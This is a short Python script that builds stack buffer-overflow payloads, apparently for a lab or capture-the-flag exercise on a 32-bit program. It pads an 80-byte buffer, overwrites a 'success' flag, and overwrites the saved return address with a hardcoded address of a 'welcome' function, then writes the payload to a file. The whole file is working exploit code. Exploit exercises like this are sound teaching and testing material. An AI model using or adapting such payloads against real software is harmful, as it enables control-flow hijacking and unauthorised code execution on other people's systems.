import struct

# Address of the 'welcome' function obtained through GDB
welcome_address = 0x565561ee
array_size = 80


def text_overflow():
    # Fill the buffer
    payload = b"A" * array_size
    # Overwrite the 'success' variable with 'T'
    payload += b"T"
    # Padding bytes to reach up to the saved EBP.
    payload += b"\x00\x00\x00"

    return payload


def ascii_overflow():
    # Fill the buffer with "A" characters
    payload = b"\x41" * array_size
    # Overwrite the 'success' variable with 'T'
    payload += b"\x54"
    # Padding bytes to reach up to the saved EBP
    payload += b"\x00\x00\x00"

    return payload

def ascii_overflow_addr():
    start_addr = 0xffffcfec
    return_addr = 0xffffd04c

    length_in_bytes = return_addr - start_addr

    # Fill the buffer with "A" characters
    payload = b"\x41" * length_in_bytes

    return payload


if __name__ == "__main__" :
    #payload = ascii_overflow()
    payload = ascii_overflow_addr()

    # Overwrite the saved EBP and the return address with the address of 'welcome'
    payload += struct.pack("I", welcome_address)
    with open("payload.txt", "wb") as f:
        f.write(payload)
